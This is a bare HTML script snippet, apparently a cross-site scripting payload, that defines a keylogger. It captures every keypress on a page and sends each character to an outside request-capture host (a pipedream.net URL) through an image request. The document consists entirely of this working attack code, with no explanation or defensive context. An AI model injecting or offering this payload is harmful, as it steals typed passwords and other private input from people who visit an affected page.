<script>
//Create keylogger function
document.onkeypress = function KeyLogger (key){
	key_pressed = String.fromCharCode(key.which);
	new Image().src="https://enp6vdge70gjs.x.pipedream.net/?"+key_pressed;
}
</script>
